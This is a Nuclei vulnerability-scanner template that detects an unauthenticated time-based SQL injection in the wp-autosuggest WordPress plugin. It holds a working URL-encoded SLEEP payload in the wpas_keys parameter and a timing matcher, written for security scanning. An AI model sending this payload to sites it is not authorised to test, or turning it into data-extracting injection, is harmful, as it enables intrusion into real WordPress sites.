http:
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 200
    - contains(content_type, "text/xml")
    - contains(body, "<results>")
    type: dsl
  raw:
  - '@timeout: 20s

    GET /wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5202%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%286%29%29%29yRVR%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dwQZ%27%2F%2A%2A%2FLIKE%2F%2A%2A%2F%27dwQZ
    HTTP/1.1

    Host: {{Hostname}}

    '
id: wp-autosuggest-sql-injection
info:
  author: theamanrawat
  classification:
    cwe-id:
    - CWE-89
  description: 'The wp-autosuggest WordPress plugin was affected by an Unauthenticated
    SQL Injection security vulnerability.

    '
  metadata:
    max-request: 1
    verified: true
  name: WP AutoSuggest 0.24 - SQL Injection
  reference:
  - https://wpscan.com/vulnerability/9188
  - https://wordpress.org/plugins/wp-autosuggest/
  severity: critical
  tags: sqli,time-based-sqli,vuln,wordpress,wp,wp-autosuggest,wp-plugin,wpscan
